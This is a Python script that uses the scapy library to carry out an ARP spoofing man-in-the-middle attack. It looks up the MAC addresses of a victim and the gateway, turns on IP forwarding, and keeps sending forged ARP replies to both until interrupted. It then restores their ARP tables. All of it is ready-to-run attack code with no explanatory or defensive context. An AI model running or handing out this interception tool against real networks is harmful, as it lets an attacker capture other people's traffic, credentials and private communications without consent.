from scapy.all import ARP, Ether, sendp, srp
import time
import sys

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, iface):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=iface, verbose=False)

def restore(target_ip, gateway_ip, target_mac, gateway_mac, iface):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    sendp(packet, count=5, iface=iface, verbose=False)

victim_ip = sys.argv[1]
gateway_ip = sys.argv[2]
iface = sys.argv[3]

victim_mac = get_mac(victim_ip, iface)
gateway_mac = get_mac(gateway_ip, iface)

with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
    f.write('1\n')

print("Starting ARP spoofing")
try:
    while True:
        spoof(victim_ip, gateway_ip, victim_mac, iface)
        spoof(gateway_ip, victim_ip, gateway_mac, iface)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring...")
    restore(victim_ip, gateway_ip, victim_mac, gateway_mac, iface)
    restore(gateway_ip, victim_ip, gateway_mac, victim_mac, iface)
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0\n')
    print("Done")
